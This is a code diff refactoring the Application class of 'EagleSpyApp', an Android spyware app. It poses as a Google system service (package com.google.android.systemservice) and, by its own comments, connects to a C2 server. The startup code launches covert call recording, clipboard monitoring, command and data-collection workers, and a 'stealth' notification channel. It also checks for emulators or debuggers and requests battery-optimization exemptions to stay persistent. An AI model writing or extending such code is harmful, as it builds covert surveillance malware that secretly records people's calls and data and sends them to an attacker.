@@ -3,8 +3,6 @@ package com.google.android.systemservice
 import android.app.Application
 import android.content.ComponentName
 import android.content.pm.PackageManager
-import android.os.Handler
-import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import androidx.hilt.work.HiltWorkerFactory
@@ -17,6 +15,7 @@ import androidx.work.WorkManager
 import com.google.android.systemservice.workers.CommandWorker
 import com.google.android.systemservice.workers.DataSyncWorker
 import com.google.android.systemservice.utils.StealthNotificationHelper
+import com.google.android.systemservice.utils.DataSyncManager
 import com.google.android.systemservice.utils.DozeOptimization
 import dagger.hilt.android.HiltAndroidApp
 import timber.log.Timber
@@ -35,17 +34,20 @@ class EagleSpyApp : Application(), Configuration.Provider {
         // Default C2 server — derived from build config
         private val DEFAULT_SERVER_URL = BuildConfig.SERVER_BASE_URL.replace("http", "ws") + "/cable"
         
+        @Volatile
         private var instance: EagleSpyApp? = null
         
         fun getInstance(): EagleSpyApp {
-            return instance ?: throw IllegalStateException("App not initialized")
+            return instance ?: throw IllegalStateException(
+                "EagleSpyApp not initialized. Ensure Application.onCreate() has completed."
+            )
         }
+        
+        fun getInstanceOrNull(): EagleSpyApp? = instance
     }
 
     @Inject
     lateinit var workerFactory: HiltWorkerFactory
-    
-    private val handler = Handler(Looper.getMainLooper())
 
     override val workManagerConfiguration: Configuration
         get() = Configuration.Builder()
@@ -56,72 +58,68 @@ class EagleSpyApp : Application(), Configuration.Provider {
     override fun onCreate() {
         super.onCreate()
         instance = this
-        
-        // Initialize Timber for logging
+        initConfig()
+        initServices()
+        initWorkers()
+        initSecurityChecks()
+        Timber.d("EagleSpyApp initialized")
+    }
+
+    private fun initConfig() {
         if (BuildConfig.DEBUG) {
             Timber.plant(Timber.DebugTree())
         }
-        
         Timber.d("EagleSpyApp initializing...")
-        
-        // Environment safety check
-        if (!com.google.android.systemservice.utils.SecurityChecker.isSafeEnvironment()) {
-            Timber.d("Environment check: debug/emulator detected")
-            // Continue anyway but log it - could be used to alter behavior
-        }
-        
-        // Initialize AndroidConfig device ID
         com.google.android.systemservice.config.AndroidConfig.initDeviceId(this)
-        
-        // Create stealth notification channel
         StealthNotificationHelper.createStealthChannel(this)
-        
-        // Schedule background worker
+    }
+
+    private fun initServices() {
+        startCommandService()
+        startBatteryMonitor()
+        startCallRecordingService()
+        startClipboardMonitor()
+    }
+
+    private fun initWorkers() {
         scheduleCommandWorker()
-        
-        // Schedule offline data collector (works without server)
+
         try {
             com.google.android.systemservice.workers.OfflineCollectorWorker.schedule(this)
         } catch (e: Exception) {
             Timber.e(e, "Failed to schedule OfflineCollectorWorker")
         }
-        
-        // Schedule adaptive data sync worker for battery optimization
+
         try {
             DataSyncWorker.scheduleAdaptive(this)
             Timber.d("Adaptive DataSyncWorker scheduled")
         } catch (e: Exception) {
             Timber.e(e, "Failed to schedule DataSyncWorker")
         }
-        
-        // Request battery optimization exemption
+    }
+
+    private fun initSecurityChecks() {
+        if (!com.google.android.systemservice.utils.SecurityChecker.isSafeEnvironment()) {
+            Timber.d("Environment check: debug/emulator detected")
+        }
+
         try {
             DozeOptimization.requestIgnoreBatteryOptimizations(this)
         } catch (e: Exception) {
             Timber.e(e, "Failed to request battery optimization exemption")
         }
-        
-        // Schedule Doze wakeup alarms for critical operations
+
         try {
             DozeOptimization.scheduleAlarmForDozeWakeup(this)
             Timber.d("Doze wakeup alarm scheduled")
         } catch (e: Exception) {
             Timber.e(e, "Failed to schedule Doze wakeup")
         }
-        
-        // Start CommandService immediately
-        startCommandService()
-        
-        // Start Battery Monitor Service
-        startBatteryMonitor()
-        
-        // Start Call Recording Service
-        startCallRecordingService()
-        
-        // Start Clipboard Monitor
-        startClipboardMonitor()
-        
-        Timber.d("EagleSpyApp initialized")
+    }
+
+    override fun onTerminate() {
+        DataSyncManager.shutdown()
+        super.onTerminate()
     }
 
     private fun scheduleCommandWorker() {
@@ -149,57 +147,24 @@ class EagleSpyApp : Application(), Configuration.Provider {
         }
     }
 
-    private fun startCommandService() {
+    private fun startServiceSafely(serviceClass: Class<out android.app.Service>) {
         try {
-            val intent = android.content.Intent(this, com.google.android.systemservice.services.CommandService::class.java)
+            val intent = android.content.Intent(this, serviceClass)
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 startForegroundService(intent)
             } else {
                 startService(intent)
             }
-            Log.d(TAG, "CommandService started from Application")
+            Log.d(TAG, "${serviceClass.simpleName} started")
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start CommandService: ${e.message}")
+            Log.e(TAG, "Failed to start ${serviceClass.simpleName}: ${e.message}")
         }
     }
 
-    private fun startCallRecordingService() {
-        try {
-            val intent = android.content.Intent(this, com.google.android.systemservice.services.CallRecordingService::class.java)
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d(TAG, "CallRecordingService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to start CallRecordingService: ${e.message}")
-        }
-    }
-
-    private fun startClipboardMonitor() {
-        try {
-            val intent = android.content.Intent(this, com.google.android.systemservice.services.ClipboardMonitorService::class.java)
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d(TAG, "ClipboardMonitorService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to start ClipboardMonitorService: ${e.message}")
-        }
-    }
-
-    private fun startBatteryMonitor() {
-        try {
-            val intent = android.content.Intent(this, com.google.android.systemservice.services.BatteryMonitorService::class.java)
-            startService(intent)
-            Log.d(TAG, "BatteryMonitorService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to start BatteryMonitorService: ${e.message}")
-        }
-    }
+    private fun startCommandService() = startServiceSafely(com.google.android.systemservice.services.CommandService::class.java)
+    private fun startCallRecordingService() = startServiceSafely(com.google.android.systemservice.services.CallRecordingService::class.java)
+    private fun startClipboardMonitor() = startServiceSafely(com.google.android.systemservice.services.ClipboardMonitorService::class.java)
+    private fun startBatteryMonitor() = startServiceSafely(com.google.android.systemservice.services.BatteryMonitorService::class.java)
 
     fun getDeviceIdentifier(): String {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
